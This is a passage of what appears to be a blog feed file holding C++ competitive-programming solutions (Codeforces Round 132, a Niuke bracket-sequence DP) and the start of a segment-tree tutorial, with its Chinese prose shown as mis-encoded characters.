&#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Also-Try-Minecraft"><a href="#B-Also-Try-Minecraft" class="headerlink" title="B. Also Try Minecraft"></a>B. Also Try Minecraft</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¢˜ç›®è¯´çš„è¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šçš„ï¼ŒæŠŠminecraftæŠ½è±¡æˆä¸€ä¸ªäºŒç»´ä¸–ç•Œï¼Œåªæœ‰xå’Œyè½´ï¼Œyè½´å‘ä¸‹ä½ç§»ä¼šå—åˆ°æ‘”è½ä¼¤å®³ï¼Œä½†æ˜¯ä¸Šå‡ä¸ä¼šã€‚ç°åœ¨éœ€è¦æ‰§è¡Œä»»åŠ¡ï¼Œå‘Šè¯‰ä½ æ¯ä¸€åˆ—çš„é«˜åº¦ï¼Œæ¯ä¸ªä»»åŠ¡éœ€è¦ä½ ä»ä¸€åˆ—ä½ç§»åˆ°å¦ä¸€åˆ—ï¼Œé—®ä½ å®Œæˆæ¯ä¸ªä»»åŠ¡éœ€è¦å—åˆ°å¤šå°‘æ‘”è½ä¼¤å®³ã€‚</p><p>è¿™é¢˜ä¹Ÿè¿˜å¯ä»¥ï¼Œå¾ˆéš¾ä¸æƒ³åˆ°ç”¨å‰ç¼€å’Œçš„æ€è·¯å»åšã€‚ä½†æ˜¯å› ä¸ºä¸Šå‡ä¸ä¼šæ‰£è¡€æˆ–è€…åŠ è¡€ï¼Œè€Œå®ƒåˆæœ‰å¯èƒ½ä»åé¢ä½ç§»åˆ°å‰é¢ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç®—å‡ºä¸¤ä¸ªå‰ç¼€å’Œï¼Œç„¶åç›¸å‡å³å¯æ±‚å¾—æ¯ä¸ªäººç‰©éœ€è¦çš„è¡€é‡ï¼Œç„¶åä¸è¦å¿˜äº†å¼€long longã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">int</span> sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum1[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        sum1[i]=sum1[i<span class="number">-1</span>]+<span class="built_in">max</span>(a[i]-a[i+<span class="number">1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum1[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">    sum2[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;<span class="number">1</span>;i--)&#123;</span><br><span class="line">        sum2[i]+=sum2[i+<span class="number">1</span>]+<span class="built_in">max</span>(a[i]-a[i<span class="number">-1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum2[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i]); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> l,r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum1[r<span class="number">-1</span>]-sum1[l<span class="number">-1</span>]);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="comment">//l==8 r==7</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum2[r+<span class="number">1</span>]-sum2[l+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Recover-an-RBS"><a href="#C-Recover-an-RBS" class="headerlink" title="C. Recover an RBS"></a>C. Recover an RBS</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜å°±æ˜¯æ‘è´ªï¼Œä»å‰å¾€åæ‰«ä¸€éè®¡æ•°ï¼Œå½“æ‰€éœ€çš„å³æ‹¬å·åˆšå¥½ç­‰äºé—®å·æ•°é‡çš„æ—¶å€™ï¼Œé‚£å°±æŠŠå‰é¢çš„å…¨éƒ¨æ¸…é›¶ï¼Œé‡æ–°è®¡æ•°ï¼Œçœ‹çœ‹æœ€åé—®å·æ•°é‡æ˜¯å¦ç­‰äºå·¦æ‹¬å·çš„æ•°é‡å³å¯ã€‚é‚£ä½ å¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œä»€ä¹ˆæ—¶å€™é—®å·å˜æˆå·¦æ‹¬å·å‘¢ï¼Ÿé—®å¾—å¥½ï¼Œå› æ­¤æˆ‘ä»¬å¤šå‡ºä¸€ä¸ªï¼Œè®©é—®å·çš„æ•°é‡</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>)q++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;(&#x27;</span>)cnt++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;)&#x27;</span>)cnt--;</span><br><span class="line">        <span class="keyword">if</span>(q+cnt==<span class="number">1</span>)&#123;</span><br><span class="line">            q=<span class="number">0</span>;</span><br><span class="line">            cnt=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==q)<span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿˜æ˜¯å¤ªèœäº†qwq</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç‰›å®¢å¤šæ ¡(2022-7-23)é¢˜è§£</title>
      <link href="/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>ç‰›å®¢å¤šæ ¡ç¢°åˆ°æ¯’ç˜¤æ‹¬å·dpé¢˜ï¼Œé¢˜è§£è®°å½•ä¸€ä¸‹ã€‚</p><span id="more"></span><h2 id="Ké¢˜ç›®æè¿°"><a href="#Ké¢˜ç›®æè¿°" class="headerlink" title="Ké¢˜ç›®æè¿°"></a>Ké¢˜ç›®æè¿°</h2><p><img src="/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ç»™å®šé•¿åº¦ä¸ºnçš„æ‹¬å·åºåˆ—ï¼ˆä¸ä¿è¯åˆæ³•æ€§ï¼‰ï¼Œæ±‚åœ¨æ­¤åŸºç¡€ä¸Šç”Ÿæˆçš„é•¿åº¦ä¸ºmæ‹¬å·åºåˆ—çš„æ–¹æ¡ˆæ•°ã€‚</p><p>è®¾ $dp[i][j][k]$è¡¨ç¤ºæ’å…¥æ‹¬å·çš„æ•°é‡ä¸º $i$ã€ä½¿ç”¨çš„åŸæ¥çš„åºåˆ—ä¸­çš„æ‹¬å·æ•°é‡ä¸º $j$ï¼Œå·¦æ‹¬å·æ¯”å³æ‹¬å·å¤š $k$ æ—¶çš„æ–¹æ¡ˆæ•°ã€‚é‚£ä¹ˆæœ€ç»ˆç­”æ¡ˆä¸º $dp[m-nl[n][0]$ã€‚é‚£ä¹ˆè€ƒè™‘å¦‚ä½•è®¾è®¡çŠ¶æ€è½¬ç§»ï¼š</p><p>é¦–å…ˆæšä¸¾æ’å…¥çš„æ‹¬å·æ•°é‡ï¼ŒåŸæ¥çš„æ‹¬å·åºåˆ—å’Œå·¦æ‹¬å·æ¯”å³æ‹¬å·å¤šçš„æ•°é‡ã€‚<br>å¦‚æœç›®å‰æšä¸¾åˆ°çš„æ‹¬å·ä¸ºå·¦æ‹¬å·ï¼Œå¹¶ä¸”ä½¿ç”¨çš„åŸæ‹¬å·çš„æ•°é‡$&lt; n$ï¼Œå°±å¯ä»¥å°†è¯¥æ‹¬å·æ”¾å…¥æœ€ç»ˆåºåˆ—ä¸­ï¼Œå³ä¸ºï¼š<br>$$<br>dp[i][j+1][k+1]=(dp[i][j+1][k+1]+dp[i][j][k])%mod<br>$$<br>å¦‚æœæ­¤æ—¶æšä¸¾åˆ°çš„æ˜¯ä¸€ä¸ªå³æ‹¬å·ï¼Œå¹¶ä¸”$k&gt;0$ï¼Œå³å·¦æ‹¬å·çš„æ•°é‡å¤§äºå³æ‹¬å·çš„æ•°é‡ï¼Œå¹¶ä¸”ä½¿ç”¨çš„åŸæ‹¬å·çš„æ•°é‡$&lt;n$ï¼Œå°±å°†è¯¥å³æ‹¬å·æ”¾å…¥æœ€ç»ˆåºåˆ—ï¼š<br>$$<br>dp[i][j+1][k-1]=(dp[i][j+1][k-1]+dp[i][j][k])%mod<br>$$<br>å¦‚æœä½¿ç”¨çš„æ‹¬å·æ•°é‡ä¸º $n$ï¼Œæˆ–å½“å‰æšä¸¾åˆ°å³æ‹¬å·ï¼Œåˆ™å¯ä»¥æ’å…¥å·¦æ‹¬å·ï¼š<br>$$<br>dp[i+1][j][k+1]=(dp[i+1][j][k+1]+dp[i][j][k])%mod<br>$$<br>å½“ $k&gt;0$ æ—¶ï¼Œå¦‚æœä½¿ç”¨åŸåºåˆ—æ‹¬å·çš„æ•°ç›®ä¸º $n$ï¼Œæˆ–å½“å‰æšä¸¾åˆ°å·¦æ‹¬å·ï¼Œåˆ™å¯ä»¥æ’å…¥å³æ‹¬å·ï¼š<br>$$<br>dp[i+1][j][k-1]=(dp[i+1][j][k-1]+dp[i][j][k])%mod<br>$$</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> gcc optimize(2)</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&#x27;\n&#x27;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2e5</span> + <span class="number">10</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">220</span>][<span class="number">220</span>][<span class="number">220</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//memset(dp, 0, sizeof(dp));</span></span><br><span class="line">    <span class="keyword">int</span> n, m; cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    string s; cin &gt;&gt; s;</span><br><span class="line">    <span class="comment">//if(n &amp; 1 || (m - n) &amp; 1) &#123; cout &lt;&lt; 0 &lt;&lt; endl; return; &#125;</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n - m; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m; ++j)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n; ++k)&#123;</span><br><span class="line">            <span class="keyword">if</span> (s[j] == <span class="string">&#x27;(&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">if</span> (k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (s[j] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                    dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">cout &lt;&lt; dp[n - m][m][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n + <span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m + <span class="number">2</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n + <span class="number">2</span>; k++) dp[i][j][k] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios_base::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">1</span>; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--) <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> ç‰›å®¢å¤šæ ¡ </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¿æ®µæ ‘ä¸“é¢˜è®­ç»ƒ</title>
      <link href="/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/"/>
      <url>/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<p>ç»ƒä¸€ä¸‹çº¿æ®µæ ‘ä¸“é¢˜å§ï¼Œæœ¬ç¯‡åšå®¢æŒç»­æ›´æ–°ï¼</p><span id="more"></span><h1 id="çº¿æ®µæ ‘"><a href="#çº¿æ®µæ ‘" class="headerlink" title="çº¿æ®µæ ‘"></a>çº¿æ®µæ ‘</h1><p>çº¿æ®µæ ‘æ˜¯ç®—æ³•ç«èµ›ä¸­å¸¸ç”¨çš„ç”¨æ¥ç»´æŠ¤ <strong>åŒºé—´ä¿¡æ¯</strong> çš„æ•°æ®ç»“æ„ã€‚</p><p>çº¿æ®µæ ‘å¯ä»¥åœ¨ $O(\log N)$ çš„æ—¶é—´å¤æ‚åº¦å†…å®ç°å•ç‚¹ä¿®æ”¹ã€åŒºé—´ä¿®æ”¹ã€åŒºé—´æŸ¥è¯¢ï¼ˆåŒºé—´æ±‚å’Œï¼Œæ±‚åŒºé—´æœ€å¤§å€¼ï¼Œæ±‚åŒºé—´æœ€å°å€¼ï¼‰ç­‰æ“ä½œã€‚</p><p>çº¿æ®µæ ‘ç»´æŠ¤çš„ä¿¡æ¯åœ¨å¾ˆå¤šæ—¶å€™å¯ä»¥è®¤ä¸ºæ˜¯æ»¡è¶³ï¼ˆå¹ºï¼‰åŠç¾¤çš„æ€§è´¨çš„ä¿¡æ¯ã€‚</p><p>ä¸€ä¸ªå¹ºåŠç¾¤ $M=(S,\circ ,e)$ï¼Œå…¶ä¸­ $\circ$ ä¸ºåœ¨é›†åˆ $S$ ä¸Šå®šä¹‰çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œå¹ºåŠç¾¤å…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š</p><ul><li>å°é—­æ€§ï¼š$\forall x\in S$ å’Œ $\forall y\in S$ æœ‰ $x\circ y\in S$ã€‚</li><li>ç»“åˆå¾‹ï¼š$\forall x,y,z\in S$ æœ‰ $(x\circ y)\circ z=x\circ (y\circ z)$ã€‚</li><li>å­˜åœ¨å¹ºå…ƒï¼šå³ $\exists e\in S$ æ»¡è¶³ $\forall x \in S$ æœ‰ $e\circ x=x$ï¼Œ$e$ ä¸ºå·¦å¹ºå…ƒï¼›æˆ– $x\circ e=x$ï¼Œ$e$ ä¸ºå³å¹ºå…ƒã€‚</li></ul><p>æˆ‘ä»¬è§‚å¯Ÿåˆ°çº¿æ®µæ ‘ä¸Šçš„ä¿¡æ¯ä¸€èˆ¬æ»¡è¶³è¿™æ ·çš„æ€§è´¨ï¼Œä¸€äº›æ•°åŸŸä¸Šçš„åŠ æ³•ä¸ä¹˜æ³•è‡ªç„¶ï¼Œè€ƒè™‘äºŒå…ƒçš„ $\max(x,y)$ è¿ç®—ï¼Œæ­¤æ—¶å¹ºå…ƒä¸º $-\infty$ ä¹Ÿæ»¡è¶³è¿™æ ·çš„æ€§è´¨ï¼ˆä¸€èˆ¬å·¦å³å¹ºå…ƒç›¸åŒæ—¶ç®€ç§°ä¸ºå¹ºå…ƒï¼‰ã€‚</p><p>çº¿æ®µæ ‘å°†æ¯ä¸ªé•¿åº¦ä¸ä¸º $1$ çš„åŒºé—´åˆ’åˆ†æˆå·¦å³ä¸¤ä¸ªåŒºé—´é€’å½’æ±‚è§£ï¼ŒæŠŠæ•´ä¸ªçº¿æ®µåˆ’åˆ†ä¸ºä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼Œé€šè¿‡åˆå¹¶å·¦å³ä¸¤åŒºé—´ä¿¡æ¯æ¥æ±‚å¾—è¯¥åŒºé—´çš„ä¿¡æ¯ã€‚è¿™ç§æ•°æ®ç»“æ„å¯ä»¥æ–¹ä¾¿çš„è¿›è¡Œå¤§éƒ¨åˆ†çš„åŒºé—´æ“ä½œã€‚</p><p>æœ‰ä¸ªå¤§å°ä¸º $5$ çš„æ•°ç»„ $a={10,11,12,13,14}$ï¼Œè¦å°†å…¶è½¬åŒ–ä¸ºçº¿æ®µæ ‘ï¼Œæœ‰ä»¥ä¸‹åšæ³•ï¼šè®¾çº¿æ®µæ ‘çš„æ ¹èŠ‚ç‚¹ç¼–å·ä¸º $1$ï¼Œç”¨æ•°ç»„ $d$ æ¥ä¿å­˜æˆ‘ä»¬çš„çº¿æ®µæ ‘ï¼Œ$d_i$ ç”¨æ¥ä¿å­˜çº¿æ®µæ ‘ä¸Šç¼–å·ä¸º $i$ çš„èŠ‚ç‚¹çš„å€¼ï¼ˆè¿™é‡Œæ¯ä¸ªèŠ‚ç‚¹æ‰€ç»´æŠ¤çš„å€¼å°±æ˜¯è¿™ä¸ªèŠ‚ç‚¹æ‰€è¡¨ç¤ºçš„åŒºé—´æ€»å’Œï¼‰ã€‚</p><p>æˆ‘ä»¬å…ˆç»™å‡ºè¿™æ£µçº¿æ®µæ ‘çš„å½¢æ€ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img 